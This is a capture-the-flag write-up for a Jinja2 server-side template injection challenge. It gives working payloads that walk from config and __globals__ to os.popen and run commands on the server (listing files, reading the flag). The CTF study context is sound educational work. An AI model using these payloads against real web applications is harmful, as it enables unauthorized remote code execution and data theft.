# echo

> ### echo
>
> #### 909 `(23 Solves)`
>
> My website keeps repeating what I input. How can I make it stop.
>
> `nc c2.lagncrash.com 8001`

![](<../../.gitbook/assets/image (15) (1).png>)

The server does indeed echo back our input. This might mean there is a SSTI vulnerability as the server injects our input into the template before sending us back.

![](<../../.gitbook/assets/image (22).png>)

Using the above payload, the engine evaluated the payload as 7777777 and hence the template engine used is Jinja2 and that the server is vulnerable to SSTI.

```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

The above payload results in an internal server error.

![](<../../.gitbook/assets/image (33).png>)

We were able to dump the configuration of the server. This also means we can abuse config to find the global symbol table and find further functions to abuse.

```
{{config.__class__.__init__.__globals__}}
```

> Python globals() function is **a built-in function used to update and return a dictionary of the current global symbol table**. The functions and variables that are not associated with any class or function are stored globally. It is mostly used for debugging purposes to see what objects the global scope actually contains

We dump all the available functions and found that the os module is loaded.

![](<../../.gitbook/assets/image (34) (1).png>)

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

We then call os.popen to execute arbitrary commands, in this case finding the files in current directory.

![](<../../.gitbook/assets/image (40).png>)

```
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```

![](<../../.gitbook/assets/image (16).png>)

